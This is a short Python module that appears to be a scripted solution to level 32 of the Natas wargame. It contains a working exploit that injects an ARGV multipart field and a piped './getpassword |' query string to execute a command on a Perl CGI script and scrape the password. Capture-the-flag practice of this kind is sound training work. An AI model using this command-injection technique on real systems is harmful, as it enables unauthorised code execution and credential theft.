import re
from src.natas.base_level import NatasLevel

class Level_32(NatasLevel):

  num = 32
  explanation = "On this level, we reuse the `ARGV` multipart injection from the previous level,\n     but append a pipe to the query string to execute `./getpassword` and retrieve the next password."

  def exploit(self) -> str:
    csv_content = b"1,2,\n3,4,\n"
    files       = [
            ("file", (None, "ARGV")),
            ("file", ("test.csv", csv_content, "text/csv")),
        ]
    PAYLOAD     = {"submit": "Upload"}
    resp = self.session.post(
      self.base_url + "/index.pl?./getpassword%20|",
      files  = files,
      data   = PAYLOAD,
    )
    match    = re.search(r"[A-Za-z0-9]{32}", resp.text)

    return match.group(0)
